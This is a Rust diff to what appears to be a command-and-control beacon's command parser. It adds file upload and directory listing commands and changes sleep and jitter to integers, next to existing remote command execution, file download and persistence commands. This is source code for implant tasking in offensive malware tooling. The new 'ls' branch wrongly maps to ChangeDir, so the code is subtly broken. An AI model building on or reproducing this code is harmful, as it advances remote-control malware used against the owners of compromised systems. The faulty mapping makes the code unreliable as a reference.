@@ -16,13 +16,15 @@ pub enum ServerCommands
 #[serde(tag="type",content="arguments",rename_all="snake_case")]
 pub enum BeaconArgs
 {
-    Config{sleep:f32, jitter:f32}, 
-    SetSleep(f32),
-    SetJitter(f32),
+    Config{sleep:u64, jitter:u64}, 
+    SetSleep(u64),
+    SetJitter(u64),
     ExecCommand(String, Option<Vec<String>>),
     FileDownload(String),
+    FileUpload(String),
     Pwd,
     ChangeDir,
+    ListDirectory,
     Persist,
     End
     //is strongly typed enum better here, or should i handle numeric argument parsing at the boundary?
@@ -36,8 +38,8 @@ impl TryFrom<&str> for ServerCommands {
         match tokens.as_slice()
         {
             ["config",sleep,jitter]=>{
-                let s:f32=sleep.parse().map_err(|_|"Invalid sleep")?;
-                let j:f32=jitter.parse().map_err(|_|"Invalid jitter")?;
+                let s:u64=sleep.parse().map_err(|_|"Invalid sleep")?;
+                let j:u64=jitter.parse().map_err(|_|"Invalid jitter")?;
                 Ok(ServerCommands::Payload(BeaconArgs::Config{sleep:s,jitter:j}))
             }
             ["setsleep",sleep]=>{
@@ -73,10 +75,16 @@ impl TryFrom<&str> for ServerCommands {
             ["FileDownload",argument]=>{
                 Ok(ServerCommands::Payload(BeaconArgs::FileDownload(argument.to_string())))
             }
+            ["FileUpload",argument]=>{
+                Ok(ServerCommands::Payload(BeaconArgs::FileUpload(argument.to_string())))
+            }
             ["pwd"]=>{
                 Ok(ServerCommands::Payload(BeaconArgs::Pwd))
             }
             ["cd"]=>{
+                Ok(ServerCommands::Payload(BeaconArgs::ChangeDir))
+            }
+            ["ls"]=>{
                 Ok(ServerCommands::Payload(BeaconArgs::ChangeDir))
             }
             ["persist"]=>{
